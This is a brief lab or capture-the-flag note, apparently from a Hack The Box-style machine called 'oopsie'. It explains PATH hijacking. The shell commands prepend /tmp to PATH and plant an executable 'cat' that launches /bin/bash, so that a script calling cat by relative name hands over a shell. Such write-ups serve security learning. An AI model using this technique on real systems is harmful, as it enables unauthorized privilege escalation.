Relative Command Bash Script

# Relative Command Bash Script

If any command is running inside the script and we wanted to execute our command on it. 
Like cat command

Let’s add the **current working directory to PATH**, create the **malicious binary and make it executable**.

```
robert@oopsie:/$ export PATH=/tmp:$PATH
robert@oopsie:/$ cd /tmp
robert@oopsie:/tmp$ echo '/bin/bash' > cat
robert@oopsie:/tmp$ chmod +x cat
```

On executing the script in tmp folder, cat command will **execute our cat command** rather than **/usr/bin/cat**